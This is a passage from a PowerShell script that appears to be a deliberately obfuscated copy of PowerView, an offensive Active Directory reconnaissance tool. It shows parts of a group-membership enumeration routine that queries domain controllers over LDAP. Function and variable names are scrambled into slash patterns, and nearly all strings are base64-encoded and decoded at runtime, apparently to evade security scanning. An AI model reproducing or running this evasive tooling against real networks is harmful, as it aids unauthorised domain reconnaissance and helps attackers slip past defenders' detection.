            ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $_.distinguishedname
            ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) ${/====\/\/\/\____/}.samaccountname
            ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) ${/====\/\/\/\____/}.distinguishedName
            if (${/====\/\/\/\____/}.samaccounttype -eq 0x10000000) {
                ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
            }
            elseif (${/====\/\/\/\____/}.samaccounttype -eq 0x30000000) {
                ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
            }
            ${_____/==\/=\___/\} = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_____/==\/=\___/\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/==\/\___/\/=\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            ${/==\/\___/\/=\/\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQBHAHIAbwB1AHAA'))))
            ${/==\/\___/\/=\/\/}
        }
    }
}
function __/\_____/===\/\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${__/==\/=\/\/\__/=\},
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${___/\___/\/\_/\/==},
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/=\/=\__/====\} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/=\__/====\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
        if (${_/\_____/=\_/===\}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                ${_/==\/=\/=\/\/\/\} = __/\_/\/\__/==\/\_ @_/\/\/\/\___/\/\/
                if (-not ${_/==\/=\/=\/\/\/\}) {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAOgAgACQASQBkAGUAbgB0AGkAdAB5AA==')))
                }
                else {
                    ${_/\_/\/=====\__/\} = ${_/==\/=\/=\/\/\/\}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                    ${/=\/=\___/====\__} = ${_/==\/=\/=\/\/\/\}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${_/=\_/======\/=\/} = $Domain
                    }
                    else {
                        if (${/=\/=\___/====\__}) {
                            ${_/=\_/======\/=\/} = ${/=\/=\___/====\__}.SubString(${/=\/=\___/====\__}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAATABEAEEAUAAgAG0AYQB0AGMAaABpAG4AZwAgAHIAdQBsAGUAIAB0AG8AIAByAGUAYwB1AHIAcwBlACAAbwBuACAAJwAkAHsALwA9AFwALwA9AFwAXwBfAF8ALwA9AD0APQA9AFwAXwBfAH0AJwAsACAAbwBuAGwAeQAgAHUAcwBlAHIAIABhAGMAYwBvAHUAbgB0AHMAIAB3AGkAbABsACAAYgBlACAAcgBlAHQAdQByAG4AZQBkAC4A')))
                    ${_/\_____/=\_/===\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYAMwA2ADgAKQAoAG0AZQBtAGIAZQByAG8AZgA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AMQA5ADQAMQA6AD0AJAB7AC8APQBcAC8APQBcAF8AXwBfAC8APQA9AD0APQBcAF8AXwB9ACkAKQA=')))
                    ${_/\_____/=\_/===\}.PropertiesToLoad.AddRange(($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA==')))))
                    ${_____/\/===\/=\_/} = ${_/\_____/=\_/===\}.FindAll() | % {$_.Properties.distinguishedname[0]}
                }
                $Null = ${_/\/\/\/\___/\/\/}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA'))))
            }
            else {
                ${__/\_/==\_/\/\___} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQApAA==')))
                    }
                    elseif (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                            ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                            if (-not ${_/\_____/=\_/===\}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwA=')))
                            }
                        }
                    }
                    elseif (${/\______/===\__/\} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${_/=\_/=====\__/=\} = (([Guid]${/\______/===\__/\}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                    }
                    elseif (${/\______/===\__/\}.Contains('\')) {
                        ${/=\/\/\___/==\_/=} = ${/\______/===\__/\}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | __/\/=\_/\/=\/=\_/ -_/============\/\/ Canonical
                        if (${/=\/\/\___/==\_/=}) {
                            ${____/====\_/=\_/\} = ${/=\/\/\___/==\_/=}.SubString(0, ${/=\/\/\___/==\_/=}.IndexOf('/'))
                            ${_/\/\_/===\_/=\/\} = ${/\______/===\__/\}.Split('\')[1]
                            ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsAXwAvAFwALwBcAF8ALwA9AD0APQBcAF8ALwA9AFwALwBcAH0AKQA=')))
                            ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/====\_/=\_/\}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7AF8AXwBfAF8ALwA9AD0APQA9AFwAXwAvAD0AXABfAC8AXAB9ACcAIABmAHIAbwBtACAAJwAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AJwA=')))
                            ${_/\_____/=\_/===\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        }
                    }
                    else {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    }
                }
                if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${_/\_____/=\_/===\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $(${_/\_____/=\_/===\}.filter)"
                try {
                    ${___/=\/\________/} = ${_/\_____/=\_/===\}.FindOne()
                }
                catch {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAOgAgACQAXwA=')))
                    ${_____/\/===\/=\_/} = @()
                }
                ${_/\_/\/=====\__/\} = ''
                ${/=\/=\___/====\__} = ''
                if (${___/=\/\________/}) {
                    ${_____/\/===\/=\_/} = ${___/=\/\________/}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))))
                    if (${_____/\/===\/=\_/}.count -eq 0) {
                        ${__/=\/\/\/=====\_} = $False
                        ${_/====\____/==\__} = 0
                        ${________/==\__/\/} = 0
                        while (-not ${__/=\/\/\/=====\_}) {
                            ${________/==\__/\/} = ${_/====\____/==\__} + 1499
                            ${_/\_/=\_/\/\_/\/=}=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAkAHsAXwAvAD0APQA9AD0AXABfAF8AXwBfAC8APQA9AFwAXwBfAH0ALQAkAHsAXwBfAF8AXwBfAF8AXwBfAC8APQA9AFwAXwBfAC8AXAAvAH0A')))
                            ${_/====\____/==\__} += 1500
                            $Null = ${_/\_____/=\_/===\}.PropertiesToLoad.Clear()
                            $Null = ${_/\_____/=\_/===\}.PropertiesToLoad.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwBcAF8ALwA9AFwAXwAvAFwALwBcAF8ALwBcAC8APQB9AA=='))))
                            $Null = ${_/\_____/=\_/===\}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))
                            $Null = ${_/\_____/=\_/===\}.PropertiesToLoad.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))
                            try {
                                ${___/=\/\________/} = ${_/\_____/=\_/===\}.FindOne()
                                ${/=\_/\/=\/\/\__/=} = ${___/=\/\________/}.Properties.PropertyNames -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAOwByAGEAbgBnAGUAPQAqAA==')))
                                ${_____/\/===\/=\_/} += ${___/=\/\________/}.Properties.item(${/=\_/\/=\/\/\__/=})
                                ${_/\_/\/=====\__/\} = ${___/=\/\________/}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                                ${/=\/=\___/====\__} = ${___/=\/\________/}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                                if (${_____/\/===\/=\_/}.count -eq 0) {
                                    ${__/=\/\/\/=====\_} = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${__/=\/\/\/=====\_} = $True
                            }
                        }
                    }
                    else {
                        ${_/\_/\/=====\__/\} = ${___/=\/\________/}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
                        ${/=\/=\___/====\__} = ${___/=\/\________/}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))))[0]
                        ${_____/\/===\/=\_/} += ${___/=\/\________/}.Properties.item(${/=\_/\/=\/\/\__/=})
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${_/=\_/======\/=\/} = $Domain
                    }
                    else {
                        if (${/=\/=\___/====\__}) {
                            ${_/=\_/======\/=\/} = ${/=\/=\___/====\__}.SubString(${/=\/=\___/====\__}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                    }
                }
            }
            ForEach (${_/==\__/=\____/\/} in ${_____/\/===\/=\_/}) {
                if (${__/==\/=\/\/\__/=\} -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    ${__/=\/=\_/=\/=\/=} = ${_/\/\/\/\___/\/\/}.Clone()
                    ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${_/==\__/=\____/\/}
                    ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                    ${__/=\/=\_/=\/=\/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAYwBuACwAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQALABvAGIAagBlAGMAdABjAGwAYQBzAHMA')))
                    $Object = _____/\/==\/\_/=== @__/=\/=\_/=\/=\/=
                    $Properties = $Object.Properties
                }
                if ($Properties) {
                    ${_____/==\/\_/\_/\} = New-Object PSObject
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${_/=\_/======\/=\/}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\_/\/=====\__/\}
                    ${_____/==\/\_/\_/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${/=\/=\___/====\__}
                    if ($Properties.objectsid) {
                        ${_/\___/\__/=\/==\} = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        ${_/\___/\__/=\/==\} = $Null
                    }
                    try {
                        ${/=\/=\/\/=\/=====} = $Properties.distinguishedname[0]
